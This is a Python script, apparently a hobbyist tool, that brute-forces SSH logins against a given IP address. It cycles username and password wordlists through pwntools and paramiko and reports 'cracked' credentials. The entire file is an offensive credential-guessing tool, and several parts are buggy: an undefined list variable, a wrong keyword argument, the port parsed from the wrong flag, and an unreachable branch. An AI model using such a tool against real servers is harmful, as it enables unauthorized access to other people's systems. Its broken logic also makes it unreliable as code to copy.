from pwn import *
import paramiko
import sys

def start_brute(ip, ul=0, pl=0, u=0, p=0, po=0):
    if not ul == 0:
        with open("./credentials/passwords.txt", "r") as password_list:
            for password in password_list:
                password = password.strip()
                try:
                    print(f"Username:{ul} \t Password:{password}")
                    response = ssh(host=ip, user=ul, password=password, port=po, timeout=1)
                    if response.connected():
                        print("##########  Username and Password Cracked Successfully ############\n")
                        print(f"Username:{ul} \t Password:{password}")
                        response.close()
                        sys.exit(1)
                except paramiko.ssh_exception.AuthenticationException:
                    print("Sorry I couldn't crack the credentials")

    elif not pl == 0:
        with open("./credentials/usernames.txt", "r") as usernames_list:
            for username in username_list:
                username = username.strip()
                try:
                    print(f"Username: {username} \t Password: {pl}")
                    response = ssh(host=ip, username=username, password=pl, port=po, timeout=1)
                    if response.connected():
                        print("##########  Username and Password Cracked Successfully  ############\n")
                        print(f"Username: {username} \t Password: {pl}")
                        response.close()
                        sys.exit(1)
                except paramiko.ssh_exception.AuthenticationException:
                    print("Sorry I couldn't crack the credentials")


    elif not u == 0:
        with open("./credentials/passwords.txt", "r") as password_list:
            for password in password_list:
                password = password.strip()
                try:
                    print(f"Username:{u} \t Password:{password}")
                    response = ssh(host=ip, user=u, password=password, port=po, timeout=1)
                    if response.connected():
                        print("##########  Password Cracked Successfully  ############\n")
                        print(f"Username: {u} \tPassword:{password}")
                        response.close()
                        sys.exit(1)
                except paramiko.ssh_exception.AuthenticationException:
                    print("Sorry I couldn't crack the credentials")

    elif not p == 0:
        with open("./credentials/usernames.txt", "r") as usernames_list:
            for username in username_list:
                username = username.strip()
                try:
                    print(f"Username: {username} \t Password: {p}")
                    response = ssh(host=ip, username=username, password=p, port=po, timeout=1)
                    if response.connected():
                        print("##########  Username Finding Successful  ############\n")
                        print(f"Username: {username} \t Password: {p}")
                        response.close()
                        sys.exit(1)
                except paramiko.ssh_exception.AuthenticationException:
                    print("Sorry I couldn't crack the credentials")

    elif not ul == 0 and not pl == 0:
        try:
            print(f"Username:{u} \t Password:{password}")
            response = ssh(host=ip, user=ul, password=pl, port=po, timeout=1)
            if response.connected():
                print("##########  Username and Password Cracked Successfully ############\n")
                print(f"Username:{ul} \t Password:{password}")
                response.close()
                sys.exit(1)
        except paramiko.ssh_exception.AuthenticationException:
            print("Sorry I couldn't crack the credentials")

    else:
        with open("./credentials/usernames.txt", "r") as username_file, open("./credentials/passwords.txt", "r") as password_file:
            username_list = [username.strip() for username in username_file]
            password_list = [password.strip() for password in password_file]

            for username in username_list:
                for password in password_list:
                    try:
                        print(f"Trying Username: {username} \t Password: {password}")
                        response = ssh(host=ip, user=username, password=password, port=po, timeout=1)
                        if response.connected():
                            print("##########  Username and Password Cracked Successfully ############\n")
                            print(f"Username: {username} \t Password: {password}")
                            response.close()
                            sys.exit(1)
                    except paramiko.ssh_exception.AuthenticationException:
                        print(f"Sorry, couldn't crack the credentials for Username: {username} and Password: {password}")


def main():
    if sys.argv[1] == "-h":
        print('''
            ****** HELP MENU *****
            1. -i [IP_ADDRESS]
            Specify the Ip address of the host
            2. -ul [USERNAME_LIST_NAME]
            Specify the username of the host inside credentials directory
            3. -pl [PASSWORD_LIST_NAME]
            Provide the password file name inside credentials directory
            4. -u [USERNAME]
            Specify the username. Default is usernames.txt
            Used if you already know the username and want to bruteforce password
            5. -p [PASSWORD_LIST_NAME]
            Specify the password. Default is passwords.txt
            Used if you already know the password and want to brutsername force username
            6. -po [PORT_NUMBER]
            Specify port number. Default is 22.
          '''
            )

    if "-po" in sys.argv:
        port = sys.argv[sys.argv.index("-i") + 1]
    else:
        port = 22

    if "-i" in sys.argv:
        ip = sys.argv[sys.argv.index("-i") + 1]
        if not "-ul" in sys.argv and not "-pl" in sys.argv and not "-u" in sys.argv and not "-p" in sys.argv:
           start_brute(ip,0,0,0,0,port) 
    else:
        print("Host IP is mandatory")
        sys.exit(0)

    if "-ul" in sys.argv:
        username_list = sys.argv[sys.argv.index("-ul") + 1]
        PATH = "./credentials/" + username_list
        with open(PATH, "r") as theusernames:
            for username in theusernames:
                username = username.strip()
                start_brute(ip, username, 0, 0, 0, port)

    if "-pl" in sys.argv:
        password_list = sys.argv[sys.argv.index("-pl") + 1]
        PATH = "./credentials/" + password_list
        with open(PATH, "r") as thepasswords:
            for password in thepasswords:
                password = password.strip()
                start_brute(ip, 0, password, 0, 0, port)

    if "-u" in sys.argv:
        username = sys.argv[sys.argv.index("-u") + 1]
        start_brute(ip, 0, 0, username, 0, port)

    if "-p" in sys.argv:
        password = sys.argv[sys.argv.index("-p") + 1]
        start_brute(ip, 0, 0, 0, password, port)

if __name__=="__main__":
    main()

    
